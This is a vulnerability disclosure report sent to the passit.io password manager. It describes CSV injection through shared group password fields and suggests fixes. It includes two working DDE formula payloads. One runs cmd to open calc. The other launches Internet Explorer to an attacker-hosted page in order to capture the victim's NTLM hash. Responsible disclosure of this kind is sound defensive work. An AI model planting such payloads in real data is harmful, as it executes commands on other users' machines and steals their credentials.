**Summary:** 
CSV-injection in export functionality

**Description:** 
Hello team!

I have found that you have a CSV-injection vulnerability in export functionality. First I thought that this is just fine but because you can group up this can be used against another users which makes this pretty critical vulnerability!

CSV-injection allows you to execute commands in another users machine when he/she exports the password details out of the passit.io web app.

## Steps To Reproduce:

  1. Make group and join it two separate accounts (attacker and victim)
  1. Now make new, "reliable", shared details to the group
  1. Set to password field (or any else field - password is just the most dangerous because victim can't see it!) this value `;=2+5+cmd|' /C calc'!A0`
  1. Go to the "victims" machine and export the passwords and when you try to open this csv it executes OS commands and opens the calculator:
{F283888}

Another way to exploit this could be like opening ie to the page where a victim tries to authentication automaticly - Use payload like this `;=6-5 cmd|' /C "C:\Program Files\Internet Explorer\iexplore.exe" http://<attackers site>/asd.html'!A0` where this `asd.html` contains the e.g `<img src="file://<attackers site/t.jpg"/>`.  Now you just basicly stole users NTLM hash and user name :)

There is lot of scenarios how an bad guy could exploit this against victims.

### How to fix?
The fix can be hard in this case but because this can be used against another users I really recommend you fix this.
Fix can be:
- Be sure that any of password fields (site, name, password etc..) won't start with character which is used to the attack by adding character `'` before these characters `;`,`=`,`+`,`-`,`@`
- You can export to `.txt` or traditional excel format
- You can cut of http sites/cmd strings or something like that

An attacker could execute OS commands against another users.
